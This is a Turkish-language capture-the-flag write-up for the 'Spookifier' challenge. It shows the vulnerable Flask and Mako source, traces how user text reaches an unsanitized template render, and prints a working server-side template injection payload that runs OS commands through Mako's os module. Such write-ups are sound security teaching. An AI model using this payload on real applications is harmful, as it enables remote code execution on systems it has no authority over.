---
{"dg-publish":true,"permalink":"/ctf/spookifier-challenges/"}
---

Zorluk, Python mako kütüphanesindeki Server-Side Template Injection güvenlik açığının istismar edilmesiyle ilgili.

* Temel Python anlayışı
* Python'da Server-Side Template Injection'dan Yararlanma.

### Uygulama Genel Bakışı  
Uygulamanın ana sayfasını ziyaret ettiğimizde, adımızı göndermek için bir form görüntülenir.

![Pasted image 20250129023608.png](/img/user/resimler/Pasted%20image%2020250129023608.png)

Herhangi bir metin gönderdiğimizde, metnin farklı yazı tipi stillerinde varyasyonları oluşturulur.

![Pasted image 20250129023646.png](/img/user/resimler/Pasted%20image%2020250129023646.png)

Bu web uygulamasındaki hemen hemen tüm özellikler bunlar.


### Exploiting Server Side Template Injection

Uygulamanın kaynak koduna sahip olduğumuz için, uygulamanın yazı tiplerini nasıl değiştirdiğine bakabiliriz. `application/blueprints/routes.py` dosyasında yalnızca bir rota tanımlanmış:

```
from flask import Blueprint, request
from flask_mako import render_template
from application.util import spookify

web = Blueprint('web', __name__)

@web.route('/')
def index():
    text = request.args.get('text')
    if(text):
        converted = spookify(text)
        return render_template('index.html',output=converted)
    
    return render_template('index.html',output='')
```


GET parametresi olan "text", ==application/util.py== dosyasında tanımlanan spookify fonksiyonuna iletilir.

```
def spookify(text):
	converted_fonts = change_font(text_list=text)

	return generate_render(converted_fonts=converted_fonts)
```

Text değeri daha sonra `change_font` fonksiyonuna iletilir ve nihayetinde sonuç ile birlikte `generate_render` çağrılır.

```

def generate_render(converted_fonts):
	result = '''
		<tr>
			<td>{0}</td>
        </tr>
        
		<tr>
        	<td>{1}</td>
        </tr>
        
		<tr>
        	<td>{2}</td>
        </tr>
        
		<tr>
        	<td>{3}</td>
        </tr>

	'''.format(*converted_fonts)
	
	return Template(result).render()

def change_font(text_list):
	text_list = [*text_list]
	current_font = []
	all_fonts = []
	
	add_font_to_list = lambda text,font_type : (
		[current_font.append(globals()[font_type].get(i, ' ')) for i in text], all_fonts.append(''.join(current_font)), current_font.clear()
		) and None

	add_font_to_list(text_list, 'font1')
	add_font_to_list(text_list, 'font2')
	add_font_to_list(text_list, 'font3')
	add_font_to_list(text_list, 'font4')

	return all_fonts
```

`change_font` fonksiyonu şu şekilde çalışır:

1. Kullanıcı tarafından girilen metin, bir karakterler listesine dönüştürülür.
2. Bu listedeki her bir karakter, dört farklı sözlükte aranır ve bulunan sonuçlar `current_font` adlı bir listeye eklenir.
3. `current_font` listesi birleştirilerek bir dizi haline getirilir ve `all_fonts` adlı listeye eklenir.
4. Son olarak, `all_fonts` listesi döndürülür ve bu liste, oluşturulan varyasyonları içerir.

Mako template engine'in generate_render fonksiyonu, sonuç listesiyle birlikte bir HTML tablosu oluşturmak için kullanılır:

https://www.makotemplates.org/

![Pasted image 20250129024620.png](/img/user/resimler/Pasted%20image%2020250129024620.png)

Kullanıcı tarafından sağlanan içerik sterilize edilmediğinden, template literals enjekte edebilir ve Server Side Template Injection (SSTI) elde edebiliriz. Aşağıdaki şablon ifadesini göndererek bunu doğrulayabiliriz `${7*7}` :

![Pasted image 20250129024736.png](/img/user/resimler/Pasted%20image%2020250129024736.png)

Sonuç, değerlendirilen template expression değerini gösterir. PayloadAllTheThings deposunda SSTI aracılığıyla kod yürütme için çalışan bir proof-of concept payload'u bulabiliriz, bu da os modülüne TemplateNamespace'den erişebileceğimizi belirtir:

```
${self.module.cache.util.os.popen('whoami').read()}
```

![Pasted image 20250129024829.png](/img/user/resimler/Pasted%20image%2020250129024829.png)

Şimdi /flag.txt dosyasından meydan okuma bayrağını okuyarak bu meydan okumanın görevini tamamlayabiliriz.
